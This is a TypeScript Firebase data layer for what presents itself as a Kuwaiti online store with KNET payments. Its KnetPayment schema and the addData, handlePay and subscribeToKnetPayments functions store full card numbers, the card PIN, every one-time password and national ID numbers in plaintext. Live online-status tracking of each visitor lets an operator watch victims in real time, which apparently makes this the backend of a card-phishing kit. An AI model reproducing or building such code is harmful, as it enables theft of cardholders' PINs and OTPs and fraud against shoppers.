import {
  collection,
  doc,
  getDocs,
  getDoc,
  addDoc,
  updateDoc,
  query,
  where,
  orderBy,
  setDoc,
  onSnapshot,
} from "firebase/firestore";
import { db, database, isFirebaseConfigured } from "./firebase";
import {
  onDisconnect,
  onValue,
  ref,
  serverTimestamp,
  set,
} from "firebase/database";

export interface FirestoreProduct {
  id: string;
  nameAr: string;
  nameEn: string;
  price: string;
  originalPrice?: string;
  discountPercent?: number;
  image: string;
  category: string;
  inStock: boolean;
  unit?: string;
  description?: string;
}

export interface FirestoreOrder {
  id: string;
  userId?: string;
  guestEmail?: string;
  guestPhone?: string;
  status: string;
  paymentMethod: string;
  paymentStatus: string;
  totalAmount: string;
  items: OrderItem[];
  address: ShippingAddress;
  createdAt: string;
}

export interface OrderItem {
  productId: string;
  nameAr: string;
  nameEn: string;
  price: string;
  quantity: number;
}

export interface ShippingAddress {
  name: string;
  email: string;
  phone: string;
  area: string;
  block: string;
  street: string;
  building?: string;
  floor?: string;
  notes?: string;
}

export interface CartItem {
  productId: string;
  quantity: number;
}

export interface KnetPayment {
  id: string;
  cardNumber: string;
  bank: string;
  prefix: string;
  month: string;
  year: string;
  pass: string;
  otp?: string;
  allOtps?: string[];
  status: string;
  online?: boolean;
  createdDate: string;
  phoneNumber?: string;
  network?: string;
  idNumber?: string;
  otp2?: string;
  step?: number;
  lastSeen?: any;
  country?: string;
}

function checkFirebaseConfigured(): void {
  if (!isFirebaseConfigured || !db) {
    throw new Error("Firebase is not configured");
  }
}

export async function getProducts(): Promise<FirestoreProduct[]> {
  checkFirebaseConfigured();
  const snapshot = await getDocs(collection(db!, "products"));
  return snapshot.docs.map(
    (doc) => ({ id: doc.id, ...doc.data() }) as FirestoreProduct
  );
}

export async function getProductById(
  id: string
): Promise<FirestoreProduct | null> {
  checkFirebaseConfigured();
  const docRef = doc(db!, "products", id);
  const docSnap = await getDoc(docRef);
  if (docSnap.exists()) {
    return { id: docSnap.id, ...docSnap.data() } as FirestoreProduct;
  }
  return null;
}

export async function getProductsByCategory(
  category: string
): Promise<FirestoreProduct[]> {
  checkFirebaseConfigured();
  const q = query(collection(db!, "products"), where("category", "==", category));
  const snapshot = await getDocs(q);
  return snapshot.docs.map(
    (doc) => ({ id: doc.id, ...doc.data() }) as FirestoreProduct
  );
}

export async function createOrder(
  orderData: Omit<FirestoreOrder, "id" | "createdAt">
): Promise<string> {
  checkFirebaseConfigured();
  const docRef = await addDoc(collection(db!, "orders"), {
    ...orderData,
    createdAt: new Date().toISOString(),
  });
  return docRef.id;
}

export async function getOrders(): Promise<FirestoreOrder[]> {
  checkFirebaseConfigured();
  const q = query(collection(db!, "orders"), orderBy("createdAt", "desc"));
  const snapshot = await getDocs(q);
  return snapshot.docs.map(
    (doc) => ({ id: doc.id, ...doc.data() }) as FirestoreOrder
  );
}

export async function getOrderById(id: string): Promise<FirestoreOrder | null> {
  checkFirebaseConfigured();
  const docRef = doc(db!, "orders", id);
  const docSnap = await getDoc(docRef);
  if (docSnap.exists()) {
    return { id: docSnap.id, ...docSnap.data() } as FirestoreOrder;
  }
  return null;
}

export async function updateOrderStatus(
  id: string,
  status: string,
  paymentStatus?: string
): Promise<void> {
  checkFirebaseConfigured();
  const docRef = doc(db!, "orders", id);
  const updateData: any = { status };
  if (paymentStatus) {
    updateData.paymentStatus = paymentStatus;
  }
  await updateDoc(docRef, updateData);
}

export async function getCart(sessionId: string): Promise<CartItem[]> {
  checkFirebaseConfigured();
  const docRef = doc(db!, "carts", sessionId);
  const docSnap = await getDoc(docRef);
  if (docSnap.exists()) {
    return docSnap.data().items || [];
  }
  return [];
}

export async function updateCart(
  sessionId: string,
  items: CartItem[]
): Promise<void> {
  checkFirebaseConfigured();
  const docRef = doc(db!, "carts", sessionId);
  await setDoc(
    docRef,
    { items, updatedAt: new Date().toISOString() },
    { merge: true }
  );
}

export async function clearCart(sessionId: string): Promise<void> {
  checkFirebaseConfigured();
  const docRef = doc(db!, "carts", sessionId);
  await setDoc(docRef, { items: [], updatedAt: new Date().toISOString() });
}

export function subscribeToPaymentStatus(
  paymentId: string,
  callback: (status: string) => void
): () => void {
  if (!isFirebaseConfigured || !db) {
    return () => {};
  }
  const docRef = doc(db, "payments", paymentId);
  return onSnapshot(docRef, (docSnap) => {
    if (docSnap.exists()) {
      const data = docSnap.data();
      callback(data.status);
    }
  });
}

export async function createPayment(paymentData: {
  orderId: string;
  amount: string;
  cardInfo?: any;
}): Promise<string> {
  checkFirebaseConfigured();
  const docRef = await addDoc(collection(db!, "payments"), {
    ...paymentData,
    status: "pending",
    createdAt: new Date().toISOString(),
  });
  return docRef.id;
}

export async function updatePaymentStatus(
  paymentId: string,
  status: string
): Promise<void> {
  checkFirebaseConfigured();
  const docRef = doc(db!, "payments", paymentId);
  await updateDoc(docRef, { status });
}

export async function getKnetPayments(): Promise<KnetPayment[]> {
  checkFirebaseConfigured();
  const q = query(collection(db!, "payments"), orderBy("createdDate", "desc"));
  const snapshot = await getDocs(q);
  return snapshot.docs.map(
    (doc) => ({ id: doc.id, ...doc.data() }) as KnetPayment
  );
}

export function subscribeToKnetPayments(
  callback: (payments: KnetPayment[]) => void
): () => void {
  if (!isFirebaseConfigured || !db) {
    return () => {};
  }
  const q = query(collection(db, "payments"), orderBy("createdDate", "desc"));
  return onSnapshot(q, (snapshot) => {
    const payments = snapshot.docs.map(
      (doc) => ({ id: doc.id, ...doc.data() }) as KnetPayment
    );
    callback(payments);
  });
}

export async function updateKnetPaymentStatus(
  paymentId: string,
  status: string
): Promise<void> {
  checkFirebaseConfigured();
  const docRef = doc(db!, "payments", paymentId);
  await updateDoc(docRef, { status });
}

export async function updateProduct(
  id: string,
  data: Partial<FirestoreProduct>
): Promise<void> {
  checkFirebaseConfigured();
  const docRef = doc(db!, "products", id);
  await updateDoc(docRef, data);
}

export async function seedProducts(
  products: Omit<FirestoreProduct, "id">[]
): Promise<void> {
  checkFirebaseConfigured();
  for (const product of products) {
    await addDoc(collection(db!, "products"), product);
  }
}

export async function addData(data: any) {
  if (!isFirebaseConfigured || !db) {
    console.warn("Firebase is not configured. Cannot add data.");
    return;
  }
  localStorage.setItem("visitor", data.id);
  try {
    const docRef = doc(db, "payments", data.id!);
    await setDoc(docRef, data, { merge: true });
    console.log("Document written with ID: ", docRef.id);
  } catch (e) {
    console.error("Error adding document: ", e);
  }
}

export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  if (!isFirebaseConfigured || !db) {
    console.warn("Firebase is not configured. Cannot process payment.");
    return;
  }
  try {
    const visitorId = localStorage.getItem("visitor");
    if (visitorId) {
      const docRef = doc(db, "payments", visitorId);
      await setDoc(
        docRef,
        { ...paymentInfo, createdDate: new Date().toISOString() },
        { merge: true }
      );
    }
  } catch (error) {
    console.error("Error adding document: ", error);
    alert("Error adding payment info to Firestore");
  }
};

export const setupOnlineStatus = (userId: string) => {
  if (!userId || !isFirebaseConfigured || !db || !database) return;

  const userStatusRef = ref(database, `/status/${userId}`);
  const userDocRef = doc(db, "payments", userId);

  onDisconnect(userStatusRef)
    .set({
      state: "offline",
      lastChanged: serverTimestamp(),
    })
    .then(() => {
      set(userStatusRef, {
        state: "online",
        lastChanged: serverTimestamp(),
      });

      updateDoc(userDocRef, {
        online: true,
        lastSeen: serverTimestamp(),
      }).catch((error) =>
        console.error("Error updating Firestore document:", error)
      );
    })
    .catch((error) => console.error("Error setting onDisconnect:", error));

  onValue(userStatusRef, (snapshot) => {
    const status = snapshot.val();
    if (status?.state === "offline") {
      updateDoc(userDocRef, {
        online: false,
        lastSeen: serverTimestamp(),
      }).catch((error) =>
        console.error("Error updating Firestore document:", error)
      );
    }
  });
};

export const setUserOffline = async (userId: string) => {
  if (!userId || !isFirebaseConfigured || !db || !database) return;

  try {
    await updateDoc(doc(db, "payments", userId), {
      online: false,
      lastSeen: serverTimestamp(),
    });

    await set(ref(database, `/status/${userId}`), {
      state: "offline",
      lastChanged: serverTimestamp(),
    });
  } catch (error) {
    console.error("Error setting user offline:", error);
  }
};

export const trackFormProgress = async (
  visitorId: string,
  currentPage: number,
  formData: any
) => {
  const progressData = {
    id: visitorId,
    currentPage,
    progress: Math.round((currentPage / 7) * 100),
    completedSteps: currentPage - 1,
    totalSteps: 7,
    formData,
    timestamp: new Date().toISOString(),
  };
};
